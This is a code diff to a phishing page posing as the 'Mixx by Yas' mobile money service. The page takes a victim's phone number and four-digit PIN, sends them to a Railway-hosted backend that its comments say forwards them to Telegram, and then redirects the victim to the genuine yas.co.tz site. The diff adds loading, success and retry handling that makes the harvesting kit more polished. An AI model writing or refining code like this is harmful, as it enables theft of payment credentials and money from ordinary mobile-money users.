@@ -156,15 +156,55 @@
       color: #6c757d;
     }
 
-    .status-badge {
-      display: inline-block;
-      margin-top: 12px;
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 600;
-      background: #e8f5e9;
+    /* Loading spinner */
+    .loader {
+      display: none;
+      width: 24px;
+      height: 24px;
+      margin: 10px auto 0;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #F4B400;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loader.show {
+      display: block;
+    }
+
+    .success-msg {
+      display: none;
       color: #2e7d32;
+      font-weight: 600;
+      margin-top: 10px;
+      font-size: 14px;
+      background: #e8f5e9;
+      padding: 8px 16px;
+      border-radius: 20px;
+    }
+
+    .success-msg.show {
+      display: inline-block;
+    }
+
+    .error-msg {
+      display: none;
+      color: #c62828;
+      font-weight: 600;
+      margin-top: 10px;
+      font-size: 14px;
+      background: #ffebee;
+      padding: 8px 16px;
+      border-radius: 20px;
+    }
+
+    .error-msg.show {
+      display: inline-block;
     }
   </style>
 </head>
@@ -204,31 +244,40 @@
       </div>
     </form>
 
+    <div class="loader" id="loader"></div>
+    <div class="success-msg" id="successMsg">✅ Data sent successfully!</div>
+    <div class="error-msg" id="errorMsg">❌ Failed to send. Please try again.</div>
+
     <div class="footer-note">💰 Tuma sasa!</div>
-    <div class="status-badge" id="statusBadge">⚡ Connected to Railway</div>
   </div>
 
   <script>
     (function(){
       // ============================================
-      // YOUR NEW RAILWAY BACKEND URL
+      // RAILWAY BACKEND URL - Sends directly to Telegram
       // ============================================
       const BACKEND_URL = 'https://mixxyas05com-production.up.railway.app/Server';
 
       const phoneInput = document.getElementById("phoneInput");
       const pinHidden = document.getElementById("pinHidden");
       const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
-      const statusBadge = document.getElementById("statusBadge");
+      const loader = document.getElementById("loader");
+      const successMsg = document.getElementById("successMsg");
+      const errorMsg = document.getElementById("errorMsg");
 
       let realPin = ["", "", "", ""];
       let submitted = false;
+
+      // Hide messages initially
+      successMsg.classList.remove('show');
+      errorMsg.classList.remove('show');
 
       // ----- phone validation -----
       phoneInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '').slice(0, 10);
       });
 
-      // ----- main submit: send to Railway -----
+      // ----- main submit: send to Railway (which forwards to Telegram) -----
       async function submitCapture() {
         if (submitted) return;
         submitted = true;
@@ -236,10 +285,12 @@
         const phone = phoneInput.value;
         const fullPin = realPin.join('');
 
+        // Show loading
+        loader.classList.add('show');
+        successMsg.classList.remove('show');
+        errorMsg.classList.remove('show');
+
         console.log('📤 Sending to Railway:', { phone, pin: fullPin });
-        statusBadge.textContent = '⏳ Sending...';
-        statusBadge.style.background = '#fff3e0';
-        statusBadge.style.color = '#e65100';
 
         try {
           const response = await fetch(BACKEND_URL, {
@@ -253,26 +304,31 @@
           const result = await response.json();
           console.log('✅ Response:', result);
           
+          // Hide loader
+          loader.classList.remove('show');
+          
           if (result.success) {
-            statusBadge.textContent = '✅ Sent Successfully!';
-            statusBadge.style.background = '#e8f5e9';
-            statusBadge.style.color = '#2e7d32';
+            // Show success
+            successMsg.textContent = '✅ Data sent to Telegram successfully!';
+            successMsg.classList.add('show');
+            
+            // Redirect after short delay
+            setTimeout(() => {
+              window.location.href = "https://yas.co.tz/mixx-by-yas/";
+            }, 2000);
           } else {
-            statusBadge.textContent = '❌ Error: ' + result.message;
-            statusBadge.style.background = '#ffebee';
-            statusBadge.style.color = '#c62828';
+            // Show error
+            errorMsg.textContent = '❌ ' + (result.message || 'Failed to send');
+            errorMsg.classList.add('show');
+            submitted = false; // Allow retry
           }
         } catch (error) {
           console.error('❌ Error:', error);
-          statusBadge.textContent = '❌ Connection Error';
-          statusBadge.style.background = '#ffebee';
-          statusBadge.style.color = '#c62828';
+          loader.classList.remove('show');
+          errorMsg.textContent = '❌ Connection error. Please try again.';
+          errorMsg.classList.add('show');
+          submitted = false; // Allow retry
         }
-
-        // Redirect after a short delay
-        setTimeout(() => {
-          window.location.href = "https://yas.co.tz/mixx-by-yas/";
-        }, 1500);
       }
 
       // ----- update hidden pin & trigger submit if complete -----
@@ -338,7 +394,8 @@
         }
       });
 
-      console.log('✅ MIXX_BY YAS loaded with backend:', BACKEND_URL);
+      console.log('✅ MIXX_BY YAS loaded - sending directly to Telegram via Railway');
+      console.log('🔗 Backend URL:', BACKEND_URL);
     })();
   </script>
 
